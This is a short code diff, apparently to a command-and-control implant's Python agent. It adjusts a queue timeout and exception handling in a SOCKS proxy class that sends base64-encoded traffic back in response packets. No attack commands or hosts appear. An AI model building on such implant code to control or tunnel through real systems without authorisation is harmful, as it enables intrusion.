@@ -257,7 +257,6 @@ def process_tasking(data):
 
     except Exception as e:
         print(e)
-        # print "processTasking exception:",e
         pass
 
 
@@ -1006,7 +1005,7 @@ class Server(secretsocks.Server):
     def write(self):
         while self.alive:
             try:
-                data = self.writebuf.get(timeout=3)
+                data = self.writebuf.get(timeout=10)
                 send_message(
                     build_response_packet(
                         61, base64.b64encode(data).decode("UTF-8"), self.resultID
@@ -1014,6 +1013,8 @@ class Server(secretsocks.Server):
                 )
             except Queue.Empty:
                 continue
+            except:
+                self.alive = False
 
 
 ################################################
